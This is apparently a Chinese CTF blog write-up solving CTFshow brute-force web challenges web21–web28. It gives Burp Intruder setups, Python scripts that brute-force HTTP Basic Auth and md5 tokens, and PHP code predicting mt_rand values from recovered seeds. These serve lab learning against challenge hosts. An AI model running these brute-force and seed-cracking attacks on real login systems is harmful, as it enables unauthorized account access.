---
title: Web入门_爆破
author: Creexile
date: 2024-07-02
lastMod: 2025-08-29
summary: ''
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [爆破, PHP, 工具, CTF]
---

# 爆破

---

## web21

- 描述: 爆破什么的，都是基操

抓包可以发现有`Authorization`字段, 将后面进行base64解码可以得到刚输入的账号密码, 格式为`admin:admin`

```
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
```

首先利用burp在`Positions`界面添加爆破点(反正我是这么叫的)

![image-20240702180550029](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702180550029.png)

然后在`Payloads`界面的`Payload Sets -> Payload type`选择"Custom iterator", 在下面的`Payload Options[Custom iterator]`中分别设置:

- Position:1 admin
- Position:2 :
- Position:3 密码字典

> 就是构建 admin:密码 的爆破payload

然后在`Payload Precessing`增加一个base64加密, 如下, 然后取消勾选最底下的`URL-encode these characters`

![image-20240702181449975](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702181449975.png)

最后点击`Start attack`即可, 爆破出来是`admin:shark63`

脚本也是一个不错的选择:

```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-11-20 19:16:49
# @Last Modified by:   h1xa
# @Last Modified time: 2020-11-20 20:28:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

import time
import requests
import base64

url = 'http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php'
# URL换成实际的靶场网址

password = []

# 使用字典
with open("1.txt", "r") as f:
	while True:
	    data = f.readline()
	    if data:
	    	password.append(data)
	    else:
	      break

for p in password:
	strs = 'admin:'+ p[:-1]
	header={
		'Authorization':'Basic {}'.format(base64.b64encode(strs.encode('utf-8')).decode('utf-8'))
	}
	rep =requests.get(url,headers=header)
	time.sleep(0.2)
	if rep.status_code ==200:
		print(rep.text)
		break
```

## web22

- 描述: 域名也可以爆破的，试试爆破这个ctf.show的子域名

一般可以用在线子域名挖掘或者本地的子域名挖掘机

## web23

- 描述: 还爆破？这么多代码，告辞！

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 11:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 11:56:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
error_reporting(0);

include('flag.php');
if(isset($_GET['token'])){
    $token = md5($_GET['token']);
    if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)){
        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
            echo $flag;
        }
    }
}else{
    highlight_file(__FILE__);

}
?>

```

分析代码: token被 md5 加密, 且它的`第一位 = 第十四位 = 第十七位`, 化为整数后`(第一位 + 第十四位 + 第十七位) / 第一位 = 第三十一位`则可获得 flag, 无脑遍历算了, 先试试两个位置的, 结果真爆出来了

```python
# coding: utf-8
import requests

a = "0123456789abcdefghijklmnopqrstuvwxyz"

for i in a:
    for j in a:
        url = "https://669fe72a-3524-4044-96f5-670a7732e87f.challenge.ctf.show/?token=" + str(i) + str(j)
        req = requests.get(url=url).text
        # 使用requests库中的get方法来获取指定url的内容，并返回该内容的文本形式。
        if "ctfshow" in req:
            print("the flag is:" + req + "\n")
            print("the poc is:" + url)
            exit()
        else:
            print("now try:" + str(i) + str(j))
            pass
```

## web24

- 描述: 爆个🔨

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:26:39
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 13:53:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
include("flag.php");
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(372619038);
    if(intval($r)===intval(mt_rand())){
        echo $flag;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}

?>
```

伪随机数还给了种子, 这还不会爆? 传值即可

```php
<?php
    mt_srand(372619038);
    echo intval(mt_rand());
    // 1155388967
?>
```

## web25

- 描述: 爆个🔨，不爆了

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:56:57
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 15:47:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
error_reporting(0);
include("flag.php");
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(hexdec(substr(md5($flag), 0,8)));
    $rand = intval($r)-intval(mt_rand());
    if((!$rand)){
        if($_COOKIE['token']==(mt_rand()+mt_rand())){
            echo $flag;
        }
    }else{
        echo $rand;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}
```

种子涉及到flag, 不能直接求到, 而`if((!$rand))` 要使这个为真，就要让 `$rand=0`
而 `$rand = intval($r)-intval(mt_rand())` , 所以要得到随机数才能构造 `$r=$mt_rand()`

我挺不理解怎么敢写`echo $rand;`的, 传入r=0可以得到随机数的相反数-243274477 (每个人似乎不同)

下载[php_mt_seed](https://github.com/openwall/php_mt_seed)解压到linux系统(用的kali, windows没试过), 本目录下执行`make`,会多出一个可执行文件php_mt_seed, 然后执行`./php_mt_seed 243274477`即可

![image-20240702201207167](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702201207167.png)

这就需要写一个 php 脚本来测试是哪个种子第一次就得到这个随机数, 然后对其中一个可能的种子请求两次并求和得到 token 的值, 都拿到了, 就可以传入对应的r和token了

```php
<?php
    $num = 1162957153;
    mt_srand($num);
    echo mt_rand();
```

```php
<?php
    $num = 3045777377;
    mt_srand($num);
    $a1 = mt_rand();
    $a2 = mt_rand();
    $a3 = mt_rand();
    echo $a1."<br/>";
    echo $a2."<br/>";
    echo $a3."<br/>";
    echo ($a2 + $a3)."<br/>";
```

## web26

- 描述: 这个可以爆

这个进去之后是安装界面, 在点击"确认无误, 开始安装"后对返回包进行抓包就能拿下flag

或者先填入默认信息, 然后对pass进行爆破,爆破得到密码7758521

![image-20240702213427481](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702213427481.png)

## web27

- 描述: CTFshow菜鸡学院招生啦！

登录界面可以下载到录取名单, 然后还有一个"学生学籍信息查询系统"; 下载下来的list中有姓名和部分身份证号(缺少日期), 应该就是利用爆破爆破出身份证号获得或者重置密码

burp自带日期爆破, 选择然后设置格式就好了

![image-20240702220146056](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702220146056.png)

爆破出来的结果: 高先伊 621022199002015237 学号02015237 密码为身份证号, 登录拿到flag

## web28

- 描述: 大海捞针

后缀是`/0/1/2.txt`, 无论怎么修改2.txt部分都会演变为无限重定向, 只能对前两个数字进行爆破

在传参处增加两个爆破点, `Attack type`选择"Cluster bomb"

![image-20240702221733584](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702221733584.png)

`Payload type`选择Number, 填写1-100, 两个爆破点是分开设置的

![image-20240702221844411](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702221844411.png)

爆破得到结果为`/72/20/`, 访问得到flag

相关文件:

- [[burp]]
- [[../../../ctf/ctf基础/爆破]]
